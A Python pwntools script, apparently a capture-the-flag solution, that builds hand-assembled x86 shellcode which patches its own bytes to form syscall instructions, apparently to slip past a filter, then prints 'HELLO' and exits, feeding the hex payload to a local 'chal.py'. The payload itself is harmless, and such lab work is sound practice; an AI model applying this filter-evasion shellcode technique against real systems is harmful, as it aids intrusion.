#!/usr/bin/env python3
from pwn import *

base = 0x1337005
syscall1_offset = 60
syscall2_offset = 80

sc = b""
sc += b"\xb8" + p32(base + syscall1_offset) + b"\x80\x00\x8d\x40\x80\x00\x40"
sc += b"\xb8" + p32(base + syscall2_offset) + b"\x80\x00\x8d\x40\x80\x00\x40"

# write(1, "HELLO\n", 6)
sc += b"\x68\x4f\x0a\x0a\x0a"  
sc += b"\x68\x4c\x4c\x45\x48" 
sc += b"\x89\xe1"  
sc += b"\xb8\x04\x00\x00\x00"  
sc += b"\xbb\x01\x00\x00\x00"  
sc += b"\xba\x05\x00\x00\x00"  

curr = len(sc)
sc += b"\xe9" + p32((syscall1_offset - curr - 5) & 0xffffffff)

while len(sc) < syscall1_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"

# exit(0)
sc += b"\xb8\x01\x00\x00\x00"
sc += b"\xbb\x00\x00\x00\x00"

curr = len(sc)
sc += b"\xe9" + p32((syscall2_offset - curr - 5) & 0xffffffff)

while len(sc) < syscall2_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"

# Loop back to exit
exit_loop = len(sc)
sc += b"\xe9" + p32((syscall2_offset - exit_loop - 5) & 0xffffffff)

print("Payload:", sc.hex())

import os
r = os.popen(f'echo "{sc.hex()}" | python chal.py 2>&1 | tail -5').read()
print(r)
